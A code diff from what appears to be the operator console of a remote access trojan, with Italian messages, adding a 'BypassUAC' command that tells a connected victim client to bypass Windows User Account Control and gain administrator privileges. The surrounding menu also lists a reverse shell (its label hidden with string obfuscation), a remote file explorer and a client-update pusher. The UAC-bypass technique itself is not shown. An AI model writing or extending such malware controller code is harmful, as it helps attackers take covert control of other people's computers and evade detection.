@@ -510,7 +510,7 @@ short UpdateClient(SOCKET Sock, int ID)
     if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath), Hidden, System))
     {
         cout << "File inviato." << endl;
-        Sleep(1000);
+        Sleep(1500);
         closesocket(Sock);
         Clients[ID].IsConnected = false;
         Clu->AggiornaTitolo();
@@ -1207,6 +1207,28 @@ short FileExplorer(SOCKET Sock, int ID)
     return 0;
 }
 
+short BypassUAC(SOCKET Sock, int ID)
+{
+	string Res = COMUNICAZIONI::PingPong(Sock, "bypassuac");
+	
+	if (Res == "OK")
+	{
+		cout << "Bypass eseguito, riavvio del Client in corso..." << endl;
+		Sleep(1500);
+        closesocket(Sock);
+        Clients[ID].IsConnected = false;
+        Clu->AggiornaTitolo();
+		return 0;
+	}
+	else if (Res == "NO")
+	{
+		cout << "Bypass non riuscito." << endl;
+		return 1;
+	}
+	
+	return 2;	
+}
+
 void Sessione(int ID, SOCKET Sock)
 {
     CLInterface cli;
@@ -1247,8 +1269,9 @@ void Sessione(int ID, SOCKET Sock)
             StampaHelp("Reboot\t\t", "- Riavvia il PC.");
 			StampaHelp((string)AY_OBFUSCATE("Reverseshell\t"), "- Lancia comandi sulla shell del PC remoto.");
             cout << char(192) << char(196) << "Revshell" << endl;
-            StampaHelp("filexplorer\t", "- Gestisci i file del PC remoto.");
+            StampaHelp("Filexplorer\t", "- Gestisci i file del PC remoto.");
             cout << char(192) << char(196) << "explorer" << endl;
+			StampaHelp("BypassUAC\t", "- Prova a bypassare l'UAC e ottenere privilegi amministrativi.");
             cout << endl;
 
             cli.SubTitle("Utility", 30, tc.Purple);
@@ -1362,6 +1385,27 @@ void Sessione(int ID, SOCKET Sock)
                 }
             }
         }
+		else if (cmd == "bypassuac")
+		{
+			if (Clients[ID].info.CompatibleVer < 2)
+                StampaIncompatibile();
+			else
+			{
+				switch (BypassUAC(Sock, ID))
+				{
+					case 0:
+						Controllo = false;
+						break;
+						
+					case 1:
+						break;
+						
+					case 2:
+						Controllo = CheckConnection(Sock, ID);
+						break;
+				}
+			}
+		}
         else
         {
             cout << "\"" << cmd << "\" non e' un comando valido, usa \"help\" per la lista di tutti i comandi." << endl;
